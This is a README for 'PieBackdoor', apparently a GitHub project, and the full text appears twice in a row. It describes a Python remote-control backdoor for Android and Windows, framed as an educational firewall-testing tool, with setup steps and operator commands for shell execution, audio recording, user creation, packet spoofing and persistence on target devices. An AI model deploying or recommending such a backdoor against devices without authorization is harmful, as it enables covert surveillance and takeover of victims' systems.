PieBackdoor

PieBackdoor is an open-source Python-based backdoor tool designed for educational penetration testing and firewall hardening. Developed by Developer Brother, it provides a modular framework to simulate advanced penetration testing techniques on authorized devices (Android via Termux and Windows). The tool is intended for ethical hacking enthusiasts, security researchers, and educators to test firewall configurations and demonstrate secure system practices.

⚠️ Ethical Use Only: PieBackdoor must only be used on devices you own or have explicit permission to test. Unauthorized use is illegal and unethical. This tool is for educational purposes only.

Features





System Operations: Gather system info, manage files, record audio, execute shell commands, and monitor processes.



Network Operations: Perform stealth port scanning, packet spoofing, and network analysis.



Admin Controls: Manage system shutdown, reboot, user accounts, registry (Windows), and persistence (with warnings).



Secure Communication: SSL-encrypted client-server communication with dynamic port hopping.



Modular Design: Four modules (system_ops, network_ops, admin_controls, communication) for maintainability.



Admin Interface: Command-line interface (admin_control.py) to manage multiple clients.



Firewall Testing: Simulate C2 traffic, port scans, and spoofed packets to test firewall rules.

License

PieBackdoor is released under the PieBackdoor License, which permits free use, modification, and distribution for educational and ethical purposes only. See the full license below and in the LICENSE file.

PieBackdoor License

PieBackdoor License
Copyright (c) 2025 Developer Brother

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to use, copy, modify, merge, publish, distribute, and/or sublicense the Software, subject to the following conditions:

1. The Software may only be used for educational purposes, ethical penetration testing, or firewall hardening on devices owned by the user or with explicit written permission from the device owner.
2. The Software must not be used for malicious, illegal, or unauthorized purposes, including but not limited to unauthorized access, data theft, or harm to systems or networks.
3. Any distribution or modification of the Software must retain this license, include attribution to Developer Brother, and clearly state the educational and ethical use restrictions.
4. The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES, OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT, OR OTHERWISE, ARISING FROM, OUT OF, OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

Prerequisites

Software





Python 3.8+ (control and target machines).



Termux (Android, from F-Droid).



OpenSSL (for SSL certificates).

Termux Dependencies

pkg install python libsndfile openssl
pip install psutil sounddevice numpy scipy pyperclip netifaces scapy

Windows Dependencies

pip install psutil sounddevice numpy scipy pyperclip netifaces scapy winreg

Permissions





Termux: Grant microphone (termux-microphone-record), storage (termux-storage-get).



Windows: Run scripts with admin privileges for features like shutdown or registry access.



Root (Termux): Optional for shutdown, reboot, add_user, del_user.



Network: Same network or port forwarding for public IPs.

Installation





Clone the Repository:

git clone https://github.com/DeveloperBrother/PieBackdoor.git
cd PieBackdoor



Generate SSL Certificates:

openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -days 365 -nodes -subj '/CN=localhost'

Place server.crt and server.key in the project directory.



Directory Structure:

PieBackdoor/
├── server.py
├── ethical_backdoor.py
├── admin_control.py
├── system_ops.py
├── network_ops.py
├── admin_controls.py
├── communication.py
├── server.crt
├── server.key
├── documentation.html
├── LICENSE
├── README.md



Test Environment:





Configure firewalls (e.g., iptables on Android, Windows Defender Firewall).



Optionally set up a test web server (e.g., Apache/Nginx).



Use virtual machines or an isolated network.

Usage

Run the Server (Control Machine)

python server.py

Listens on 0.0.0.0:4444 (or random port if blocked) with SSL.

Run the Client (Target Device)

python ethical_backdoor.py client <server_ip>

Connects with SSL, using dynamic port hopping.

Run the Admin Interface (Control Machine)

python admin_control.py





Enter server IP and port (default 4444).



Commands:





list_clients: List connected clients.



send <client_id> <command>: Send a command (e.g., send 192.168.1.100:12345 sysinfo).



batch <command>: Send to all clients (e.g., batch sysinfo).



exit: Quit.

Example Commands

send <client_id> sysinfo
send <client_id> portscan 192.168.1.1 1-100
send <client_id> spoof 192.168.1.1 10
send <client_id> add_user testuser pass123
send <client_id> shutdown

See documentation.html for all commands.

Modules





system_ops.py: System info, file operations, audio recording, process management.



network_ops.py: Port scanning, packet spoofing, network info.



admin_controls.py: Shutdown, reboot, user management, registry access, persistence.



communication.py: SSL communication, client-server logic.

Firewall Testing

Test firewall hardening with:





Port Blocking: send <client_id> portscan 192.168.1.1 1-1000



Scan Detection: send <client_id> portscan 192.168.1.1 1-100



Traffic Analysis: send <client_id> spoof 192.168.1.1 10



Persistence: send <client_id> persist



Web Server: send <client_id> shell curl http://localhost

Validate by:





Blocking non-standard ports.



Detecting scans with IDS (e.g., Snort).



Using DPI for spoofed traffic.



Rate-limiting connections.

Educational Use

For videos or courses:





Show Termux setup and permissions.



Demonstrate the admin interface and commands like sysinfo, portscan, spoof.



Explain firewall testing and hardening.



Include a disclaimer: "For educational purposes on authorized devices only."

Contributing

Contributions are welcome! To contribute:





Fork the repository.



Create a feature branch (git checkout -b feature/YourFeature).



Commit changes (git commit -m 'Add YourFeature').



Push to the branch (git push origin feature/YourFeature).



Open a Pull Request.

Please ensure contributions align with the educational and ethical goals of PieBackdoor.

Ethical and Legal Notes





Authorized Use: Only test on devices you own or have explicit permission to access.



Legal Compliance: Adhere to local laws and ethical hacking standards (e.g., CEH, OSCP).



Safeguards: No persistence by default; simulated keylogging uses fake data.



Disclaimer: Clearly state educational intent in any public use.

Contact

For issues, suggestions, or questions, open an issue on the GitHub repository.



Developed by Developer Brother
Empowering ethical hackers and educators with open-source tools.PieBackdoor

PieBackdoor is an open-source Python-based backdoor tool designed for educational penetration testing and firewall hardening. Developed by Developer Brother, it provides a modular framework to simulate advanced penetration testing techniques on authorized devices (Android via Termux and Windows). The tool is intended for ethical hacking enthusiasts, security researchers, and educators to test firewall configurations and demonstrate secure system practices.

⚠️ Ethical Use Only: PieBackdoor must only be used on devices you own or have explicit permission to test. Unauthorized use is illegal and unethical. This tool is for educational purposes only.

Features





System Operations: Gather system info, manage files, record audio, execute shell commands, and monitor processes.



Network Operations: Perform stealth port scanning, packet spoofing, and network analysis.



Admin Controls: Manage system shutdown, reboot, user accounts, registry (Windows), and persistence (with warnings).



Secure Communication: SSL-encrypted client-server communication with dynamic port hopping.



Modular Design: Four modules (system_ops, network_ops, admin_controls, communication) for maintainability.



Admin Interface: Command-line interface (admin_control.py) to manage multiple clients.



Firewall Testing: Simulate C2 traffic, port scans, and spoofed packets to test firewall rules.

License

PieBackdoor is released under the PieBackdoor License, which permits free use, modification, and distribution for educational and ethical purposes only. See the full license below and in the LICENSE file.

PieBackdoor License

PieBackdoor License
Copyright (c) 2025 Developer Brother

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to use, copy, modify, merge, publish, distribute, and/or sublicense the Software, subject to the following conditions:

1. The Software may only be used for educational purposes, ethical penetration testing, or firewall hardening on devices owned by the user or with explicit written permission from the device owner.
2. The Software must not be used for malicious, illegal, or unauthorized purposes, including but not limited to unauthorized access, data theft, or harm to systems or networks.
3. Any distribution or modification of the Software must retain this license, include attribution to Developer Brother, and clearly state the educational and ethical use restrictions.
4. The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES, OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT, OR OTHERWISE, ARISING FROM, OUT OF, OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

Prerequisites

Software





Python 3.8+ (control and target machines).



Termux (Android, from F-Droid).



OpenSSL (for SSL certificates).

Termux Dependencies

pkg install python libsndfile openssl
pip install psutil sounddevice numpy scipy pyperclip netifaces scapy

Windows Dependencies

pip install psutil sounddevice numpy scipy pyperclip netifaces scapy winreg

Permissions





Termux: Grant microphone (termux-microphone-record), storage (termux-storage-get).



Windows: Run scripts with admin privileges for features like shutdown or registry access.



Root (Termux): Optional for shutdown, reboot, add_user, del_user.



Network: Same network or port forwarding for public IPs.

Installation





Clone the Repository:

git clone https://github.com/DeveloperBrother/PieBackdoor.git
cd PieBackdoor



Generate SSL Certificates:

openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -days 365 -nodes -subj '/CN=localhost'

Place server.crt and server.key in the project directory.



Directory Structure:

PieBackdoor/
├── server.py
├── ethical_backdoor.py
├── admin_control.py
├── system_ops.py
├── network_ops.py
├── admin_controls.py
├── communication.py
├── server.crt
├── server.key
├── documentation.html
├── LICENSE
├── README.md



Test Environment:





Configure firewalls (e.g., iptables on Android, Windows Defender Firewall).



Optionally set up a test web server (e.g., Apache/Nginx).



Use virtual machines or an isolated network.

Usage

Run the Server (Control Machine)

python server.py

Listens on 0.0.0.0:4444 (or random port if blocked) with SSL.

Run the Client (Target Device)

python ethical_backdoor.py client <server_ip>

Connects with SSL, using dynamic port hopping.

Run the Admin Interface (Control Machine)

python admin_control.py





Enter server IP and port (default 4444).



Commands:





list_clients: List connected clients.



send <client_id> <command>: Send a command (e.g., send 192.168.1.100:12345 sysinfo).



batch <command>: Send to all clients (e.g., batch sysinfo).



exit: Quit.

Example Commands

send <client_id> sysinfo
send <client_id> portscan 192.168.1.1 1-100
send <client_id> spoof 192.168.1.1 10
send <client_id> add_user testuser pass123
send <client_id> shutdown

See documentation.html for all commands.

Modules





system_ops.py: System info, file operations, audio recording, process management.



network_ops.py: Port scanning, packet spoofing, network info.



admin_controls.py: Shutdown, reboot, user management, registry access, persistence.



communication.py: SSL communication, client-server logic.

Firewall Testing

Test firewall hardening with:





Port Blocking: send <client_id> portscan 192.168.1.1 1-1000



Scan Detection: send <client_id> portscan 192.168.1.1 1-100



Traffic Analysis: send <client_id> spoof 192.168.1.1 10



Persistence: send <client_id> persist



Web Server: send <client_id> shell curl http://localhost

Validate by:





Blocking non-standard ports.



Detecting scans with IDS (e.g., Snort).



Using DPI for spoofed traffic.



Rate-limiting connections.

Educational Use

For videos or courses:





Show Termux setup and permissions.



Demonstrate the admin interface and commands like sysinfo, portscan, spoof.



Explain firewall testing and hardening.



Include a disclaimer: "For educational purposes on authorized devices only."

Contributing

Contributions are welcome! To contribute:





Fork the repository.



Create a feature branch (git checkout -b feature/YourFeature).



Commit changes (git commit -m 'Add YourFeature').



Push to the branch (git push origin feature/YourFeature).



Open a Pull Request.

Please ensure contributions align with the educational and ethical goals of PieBackdoor.

Ethical and Legal Notes





Authorized Use: Only test on devices you own or have explicit permission to access.



Legal Compliance: Adhere to local laws and ethical hacking standards (e.g., CEH, OSCP).



Safeguards: No persistence by default; simulated keylogging uses fake data.



Disclaimer: Clearly state educational intent in any public use.

Contact

For issues, suggestions, or questions, open an issue on the GitHub repository.



Developed by Developer Brother
Empowering ethical hackers and educators with open-source tools.
